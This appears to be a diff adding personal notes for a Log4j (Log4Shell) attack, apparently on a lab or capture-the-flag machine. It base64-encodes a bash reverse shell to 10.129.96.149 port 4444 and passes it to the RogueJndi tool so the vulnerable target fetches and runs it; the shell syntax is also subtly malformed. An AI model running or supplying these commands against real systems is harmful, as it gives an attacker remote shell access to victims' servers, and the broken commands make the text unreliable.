@@ -1,0 +1,6 @@
+# use this command to get the hashed command to use in log4j attack
+echo "bash -c bash -i >&2>dev/tcp/10.129.96.149/4444 0>&1" | base64 > commandbase64
+
+# use this command to send 
+~/util/rogue-jndi
+java -jar target/RogueJndi-1.1.jar --command "bash -c {echo, <hash>}|{base64, -d}|{bash -i}" --hostname "target-ip"
